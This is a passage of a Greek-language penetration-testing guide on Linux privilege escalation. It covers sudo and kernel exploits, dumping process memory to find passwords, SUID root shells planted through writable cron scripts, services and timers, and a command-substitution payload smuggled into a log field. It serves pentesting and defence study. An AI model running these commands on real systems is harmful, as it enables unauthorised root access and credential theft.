# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας ξεκινήσουμε αποκτώντας πληροφορίες για το OS που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Αν **έχετε δικαιώματα εγγραφής σε οποιοδήποτε φάκελο μέσα στη μεταβλητή `PATH`** μπορεί να είστε σε θέση να hijack κάποιες libraries ή binaries:
```bash
echo $PATH
```
### Στοιχεία περιβάλλοντος

Υπάρχουν ενδιαφέρουσες πληροφορίες, passwords ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την kernel version και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή vulnerable kernel list και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλες σελίδες όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις vulnerable kernel versions από αυτή την ιστοσελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **ψάξτε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σας αναφέρεται σε κάποιο kernel exploit και έτσι θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo έκδοση

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Εκδόσεις του Sudo πριν από την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να αποκτήσουν δικαιώματα root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από κατάλογο που ελέγχεται από τον χρήστη.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν τρέξετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` σας είναι ευάλωτη και ότι υποστηρίζει τη λειτουργία `chroot`.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg η επαλήθευση υπογραφής απέτυχε

Δείτε **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η vuln θα μπορούσε να αξιοποιηθεί
```bash
dmesg 2>/dev/null | grep "signature"
```
### Επιπλέον system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Απαρίθμηση πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **what is mounted and unmounted**, πού και γιατί. Αν κάτι είναι unmounted μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαρίθμηση χρήσιμων binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, έλεγξε αν **υπάρχει εγκατεστημένος κάποιος compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσεις κάποιο kernel exploit, καθώς συνιστάται να το compile στο μηχάνημα όπου θα το χρησιμοποιήσεις (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευάλωτο Λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευθεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε πρόσβαση SSH στη μηχανή μπορείτε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε αν υπάρχει ξεπερασμένο ή ευπαθές λογισμικό εγκατεστημένο στη μηχανή.

> [!NOTE] > _Να σημειωθεί ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, επομένως συνιστώνται εφαρμογές όπως το OpenVAS ή παρόμοιες που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευπαθής σε γνωστά exploits_

## Διεργασίες

Δείτε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** εντοπίζει αυτά ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διεργασίας.\
Επίσης **έλεγξε τα προνόμια σου πάνω στα binaries των διεργασιών**, ίσως να μπορέσεις να αντικαταστήσεις κάποιο.

### Process monitoring

Μπορείς να χρησιμοποιήσεις εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείς διεργασίες. Αυτό μπορεί να είναι ιδιαίτερα χρήσιμο για να εντοπίσεις ευάλωτες διεργασίες που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Process memory

Κάποιες υπηρεσίες ενός διακομιστή αποθηκεύουν **credentials in clear text inside the memory**.\
Συνήθως θα χρειαστείς **root privileges** για να διαβάσεις τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είσαι ήδη root και θέλεις να ανακαλύψεις περισσότερα credentials.\
Ωστόσο, θυμήσου ότι **ως κανονικός χρήστης μπορείς να διαβάσεις τη μνήμη των διεργασιών που κατέχεις**.

> [!WARNING]
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον μη προνομιούχο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να γίνουν debug, αρκεί να έχουν το ίδιο uid. Αυτή είναι η κλασική λειτουργία του ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο μια γονική διεργασία μπορεί να γίνει debug.
> - **kernel.yama.ptrace_scope = 2**: Μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Δεν επιτρέπεται να γίνει tracing με ptrace σε καμία διεργασία. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Εάν έχεις πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα) θα μπορούσες να πάρεις το Heap και να αναζητήσεις μέσα τα credentials της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δοσμένο PID διεργασίας, το **maps** δείχνει πώς η μνήμη αντιστοιχίζεται στον εικονικό χώρο διευθύνσεων της διεργασίας· επίσης δείχνει τα **δικαιώματα κάθε αντιστοιχισμένης περιοχής**. Το ψευδο-αρχείο **mem** αποκαλύπτει την ίδια τη μνήμη της διεργασίας. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek στο αρχείο mem και να dump όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, το `/dev/mem` μπορεί να διαβαστεί μόνο από τον χρήστη **root** και από την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επανεπινόηση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρες το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις για root και να dump τη διεργασία που ανήκει σε εσάς
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Εάν διαπιστώσετε ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump τη process (δείτε τις προηγούμενες ενότητες για να βρείτε διάφορους τρόπους να dump τη memory μιας process) και να αναζητήσετε credentials μέσα στη memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) θα **αποσπάσει διαπιστευτήρια απλού κειμένου από τη μνήμη** και από κάποια **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                    | Όνομα Διεργασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Αν ένα web “Crontab UI” πάνελ (alseambusher/crontab-ui) τρέχει ως root και είναι δεσμευμένο μόνο στο loopback, μπορείς να το προσεγγίσεις μέσω SSH local port-forwarding και να δημιουργήσεις μια privileged job για να escalate.

Τυπική αλυσίδα
- Εντοπίστε loopback-only port (π.χ., 127.0.0.1:8000) και Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
- Backups/scripts με `zip -P <password>`
- systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιουργήστε ένα high-priv job και τρέξτε το αμέσως (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε το Crontab UI ως root; περιορίστε το με έναν αφιερωμένο χρήστη και ελάχιστα δικαιώματα
- Bind to localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN; μην επαναχρησιμοποιείτε passwords
- Αποφύγετε να ενσωματώνετε secrets σε unit files; χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για εκτελέσεις εργασιών κατ' απαίτηση

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Αν ένα script που εκτελείται από τον root περιέχει “**\***” μέσα σε μια εντολή, μπορείς να το εκμεταλλευτείς για να προκαλέσεις απρόσμενα αποτελέσματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το wildcard προηγείται ενός μονοπατιού όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμα και** _**./\***_ **δεν είναι).**

Διάβασε την παρακάτω σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Το Bash εκτελεί parameter expansion και command substitution πριν την arithmetic evaluation σε ((...)), $((...)) και let. Εάν ένας root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε ένα arithmetic context, ένας επιτιθέμενος μπορεί να εισάγει ένα command substitution $(...) που εκτελείται ως root όταν τρέξει το cron.

- Why it works: Στο Bash, οι expansions συμβαίνουν με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, έπειτα word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` υποκαθίσταται πρώτα (εκτελώντας την εντολή), και το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για την arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Κάντε ώστε κείμενο που ελέγχεται από τον επιτιθέμενο να γραφτεί στο parsed log ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ένα ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή ανακατευθύνετέ το) ώστε η arithmetic να παραμένει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν μπορείτε να **τροποποιήσετε ένα cron script** που εκτελείται από root, μπορείτε πολύ εύκολα να αποκτήσετε ένα shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από root χρησιμοποιεί έναν **directory στον οποίο έχετε πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον folder και να **δημιουργήσετε έναν symlink folder προς κάποιον άλλο** που τρέχει ένα script που ελέγχετε.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Οι Blue teams μερικές φορές "sign" cron-driven binaries εκχυλίζοντας ένα custom ELF section και κάνοντας grep για ένα vendor string πριν τα εκτελέσουν ως root. Αν αυτό το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείτε να leak το signing material, μπορείτε να forge το section και να hijack το cron task:

1. Use `pspy` για να καταγράψετε το verification flow. Στο Era, ο root έτρεξε `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` και στη συνέχεια εκτέλεσε το αρχείο.
2. Αναδημιουργήστε το αναμενόμενο certificate χρησιμοποιώντας το leaked key/config (από `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Κατασκευάστε ένα malicious replacement (π.χ., drop a SUID bash, add your SSH key) και embed το certificate μέσα στο `.text_sig` ώστε το grep να περάσει:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite το scheduled binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περιμένετε για το επόμενο cron run· μόλις ο naive signature check περάσει, το payload σας τρέχει ως root.

### Frequent cron jobs

Μπορείτε να monitor τις διεργασίες για να αναζητήσετε processes που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσετε να το εκμεταλλευτείτε και να escalate privileges.

Για παράδειγμα, για να **παρακολουθείτε κάθε 0.1s για 1 λεπτό**, **ταξινομήσετε κατά τις λιγότερο εκτελεσμένες εντολές** και να διαγράψετε τις εντολές που έχουν εκτελεστεί περισσότερο, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε process που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατό να δημιουργηθεί ένα cronjob **βάζοντας ένα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημείωσε τον χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Αρχεία _.service_ με δικαιώματα εγγραφής

Έλεγξε αν μπορείς να γράψεις οποιοδήποτε `.service` αρχείο, αν μπορείς, **θα μπορούσες να το τροποποιήσεις** έτσι ώστε **να εκτελεί** το **backdoor όταν** η υπηρεσία **ξεκινάει**, **επανεκκινείται** ή **σταματάει** (ίσως χρειαστεί να περιμένεις μέχρι να γίνει επανεκκίνηση του μηχανήματος).\
Για παράδειγμα δημιούργησε το backdoor σου μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Δυαδικά αρχεία υπηρεσίας με δικαιώματα εγγραφής

Να θυμάσαι ότι αν έχεις **δικαιώματα εγγραφής επί των binaries που εκτελούνται από services**, μπορείς να τα αλλάξεις για backdoors έτσι ώστε όταν οι services επανεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Σχετικές Διαδρομές

Μπορείς να δεις το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Εάν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να μπορέσετε να **escalate privileges**. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Τότε, δημιούργησε ένα **εκτελέσιμο** με το **ίδιο όνομα με το δυαδικό αρχείο της σχετικής διαδρομής** μέσα στον systemd PATH φάκελο που μπορείς να γράψεις, και όταν στο service ζητηθεί να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σου θα εκτελεστεί (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν services αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Χρονιστές**

Οι **χρονιστές** είναι αρχεία μονάδας του systemd των οποίων το όνομα λήγει σε `**.timer**` και που ελέγχουν αρχεία ή συμβάντα `**.service**`. Οι **χρονιστές** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς έχουν ενσωματωμένη υποστήριξη για συμβάντα χρόνου ημερολογίου και μονοτονικά χρονικά συμβάντα και μπορούν να τρέξουν ασύγχρονα.

Μπορείς να απαριθμήσεις όλους τους χρονιστές με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Αν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποιες υπάρχουσες μονάδες του systemd.unit (όπως ένα `.service` ή ένα `.target`).
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτός ο timer. Το όρισμα είναι ένα όνομα μονάδας, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλογής σε μια service που έχει το ίδιο όνομα με την timer unit, εκτός από το επίθημα. (Βλέπε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της timer unit να ονομάζονται ταυτόσημα, εκτός από το επίθημα.

Επομένως, για να καταχραστείτε αυτήν την άδεια θα χρειαστεί να:

- Βρείτε κάποια systemd unit (όπως `.service`) που **εκτελεί ένα εγγράψιμο binary**
- Βρείτε κάποια systemd unit που **εκτελεί μια σχετική διαδρομή** και έχετε **δικαιώματα εγγραφής** στο **systemd PATH** (για να προσποιηθείτε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους timers με `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε έναν timer χρειάζεστε προνόμια root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** στο ίδιο ή σε διαφορετικά μηχανήματα μέσα σε μοντέλα client-server. Χρησιμοποιούν τυπικά αρχεία descriptor του Unix για επικοινωνία μεταξύ υπολογιστών και διατάσσονται μέσω αρχείων `.socket`.

Sockets μπορούν να διαμορφωθούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να διαμορφωθούν διάφορες ενδιαφέρουσες παράμετροι:

